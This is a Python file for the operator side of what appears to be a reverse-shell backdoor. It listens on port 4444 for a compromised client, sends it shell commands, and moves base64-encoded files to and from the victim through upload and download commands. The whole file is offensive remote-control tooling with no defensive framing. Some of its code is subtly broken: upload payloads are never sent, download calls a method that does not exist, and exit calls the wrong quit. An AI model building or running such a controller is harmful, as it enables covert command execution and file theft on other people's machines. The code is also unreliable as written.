import socket
import json
import base64

class Connection:
    def __init__(self, server_host, server_port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # option that allows reuse of socket if disconnected or cuts
        self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        self.connection.bind((server_host, server_port))
        # listens and accepts if client attempts to connect
        self.connection.listen(1) # backlog
        print(f"looking for clients as {server_host}:{server_port}")
        self.client_socket, client_address = self.connection.accept() # self allows you to use self.connection anywhere in class
        print(f"{client_address[0]}:{client_address[1]} Connected")
    
    def json_send(self, data):
        json_data = json.dumps(data).encode()
        self.client_socket.send(json_data)
    
    def json_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.client_socket.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_command(self, command):
        if command.lower() == "exit":
            quit()
        self.json_send(command)
        return self.json_recieve()
    
    def quit(self):
            print("closed connection")
            self.connection.close()

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                file_content = base64.b64encode(file.read()).decode('utf-8')
                return file_content
        except Exception as e:
            print(f"Server read_file brokie: {str(e)}")
            return None

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "[Download Sucessful]"
        except Exception as e:
            print(f"Server write_file brokie: {str(e)}")
            return None
              
    def run(self):
        while True:
            try:
                command = input(">> ")
                command_word = command.split()

                if command_word[0] == "upload":
                    file_content = self.read_file(command_word[1])
                    command_word.append(file_content)
                
                result = self.execute_command(command)

                if command_word[0] == "download":
                    result = self.write_read(command_word[1], result)

                print(result)

            except Exception as e:
                print(f"Server run brokie: {str(e)}")

server_host = "localhost" # 192.168.0.81
server_port = 4444

connection = Connection(server_host,server_port)
connection.run()